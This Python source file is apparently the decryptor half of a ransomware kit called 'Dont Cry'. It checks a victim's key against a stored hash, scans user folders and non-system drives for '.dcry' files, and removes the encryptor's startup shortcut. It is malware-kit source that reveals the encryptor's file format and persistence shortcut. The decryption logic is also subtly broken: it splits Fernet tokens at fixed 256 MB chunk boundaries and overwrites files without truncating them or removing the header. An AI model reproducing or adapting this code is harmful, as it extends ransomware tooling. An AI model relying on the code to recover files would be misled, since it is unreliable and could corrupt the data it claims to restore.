import ctypes
import hashlib
import os
import string
import sys
from concurrent.futures import ThreadPoolExecutor

import winshell
from colorama import Fore, init
from cryptography.fernet import Fernet, InvalidToken

init(autoreset=True)

baner = rf""" {Fore.LIGHTRED_EX} _______                     __   __             ______                      
 |       \                   |  \ |  \           /      \                     
 | $$$$$$$\  ______   _______| $$_| $$_         |  $$$$$$\  ______   __    __ 
 | $$  | $$ /      \ |       \\$|   $$ \        | $$   \$$ /      \ |  \  |  \
 | $$  | $$|  $$$$$$\| $$$$$$$\  \$$$$$$        | $$      |  $$$$$$\| $$  | $$
 | $$  | $$| $$  | $$| $$  | $$   | $$ __       | $$   __ | $$   \$$| $$  | $$
 | $$__/ $$| $$__/ $$| $$  | $$   | $$|  \      | $$__/  \| $$      | $$__/ $$
 | $$    $$ \$$    $$| $$  | $$    \$$  $$       \$$    $$| $$       \$$    $$
  \$$$$$$$   \$$$$$$  \$$   \$$     \$$$$         \$$$$$$  \$$       _\$$$$$$$
                                                                    |  \__| $$
                                                                     \$$    $$
                                                                      \$$$$$$
 
                             Decryptor by MemeCoder                            """

try:
    print("\033[2J\033[H", end="")
    print(baner)
    print()
    key = bytes(input("Enter a key: ").strip().encode())
except KeyboardInterrupt:
    exit(1)


def is_valid_key(key):
    try:
        key_file = os.path.join(os.environ["USERPROFILE"], "key")
        if not key or not os.path.exists(key_file):
            return False
        with open(key_file, "r") as f:
            return f.read() == hashlib.sha256(key).hexdigest()
    except:
        return False


def start_decryption():
    if not is_valid_key(key):
        print(f"\n{Fore.LIGHTRED_EX}Invalid key")
        input("Press enter to exit...")
        sys.exit(2)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Downloads"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Documents"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Pictures"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Videos"), key)
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for disk in [
        f"{letter}:/"
        for i, letter in enumerate(string.ascii_uppercase)
        if bitmask & (1 << i)
    ]:
        if not os.path.samefile(
            disk, os.getenv("SystemDrive") + "/"
        ) and not os.path.samefile(disk, os.getenv("HOMEDRIVE") + "/"):
            decrypt_directory(disk, key)


def decrypt_file(path, key, chunk_size=268435456):
    try:
        MAGIC = b"DCRY$"
        with open(path, "r+b", buffering=-1) as f:
            header = f.read(len(MAGIC))
            if header != MAGIC:
                return
            file_size = os.path.getsize(path)
            cipher = Fernet(key)
            offset = len(MAGIC)
            while (chunk := f.read(chunk_size)):
                decrypted_chunk = cipher.decrypt(chunk)
                f.seek(offset)
                f.write(decrypted_chunk)
                offset += len(chunk)
            f.seek(0)
        os.rename(path, os.path.splitext(path)[0])
    except InvalidToken:
        print(f"\n{Fore.LIGHTRED_EX}Invalid token")
        input("Press enter to exit...")
        sys.exit(2)
    except Exception as e:
        print(f"\n{Fore.LIGHTRED_EX}Error decrypting {path}: {e}")
        return


def decrypt_directory(directory_path, key):
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = []
        for root, _, files in os.walk(directory_path):
            for file in files:
                if os.path.splitext(file)[1] != ".dcry":
                    continue
                file_path = os.path.join(root, file)
                futures.append(executor.submit(decrypt_file, file_path, key))
        for future in futures:
            future.result()


def main():
    start_decryption()
    startup = winshell.startup()
    shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
    if os.path.exists(shortcut_path):
        try:
            os.remove(shortcut_path)
        except:
            pass


if __name__ == "__main__":
    main()
